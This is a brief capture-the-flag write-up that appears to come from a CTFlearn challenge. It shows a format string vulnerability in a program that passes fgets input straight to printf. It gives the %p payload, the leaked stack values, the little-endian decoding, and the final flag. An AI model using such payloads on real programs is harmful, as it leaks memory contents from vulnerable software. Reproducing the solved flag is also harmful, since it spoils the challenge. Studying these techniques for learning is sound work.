fgets will take the input of the user and put to the buffer

however, printf is very dangerous since it treats in buffer as a string not a plain text. So we can perform string attack:
What is your favorite format tag? %p %p %p %p %p %p %p %p %p %p %p %p


by adding multiple %p, we can start to print out what is inside the stack. Since the flag is store inside the stack earlier, we can take it out.

0x713dce7e3963 0xfbad208b 0x7ffe4eb55970 0x1 (nil) 0x800 0x560d045482a0 

0x6e7261656c465443 
0x5f336b316c5f317b 
0x745f74346d723066 
0x7d3030745f356734 

0x1000a

The 4 in a row seems to be the message since the buffer is 64 bytes, each pointer is 8 bytes
Let's reverse it in little-endian and we can get the message

4354466c6561726e -> CTFlearn
7b315f6c316b335f -> {1_l1k3_
6630726d34745f74 -> f0rm4t_t
3467355f7430307d -> 4g5_t00}

-> flag: CTFlearn{1_l1k3_f0rm4t_t4g5_t00}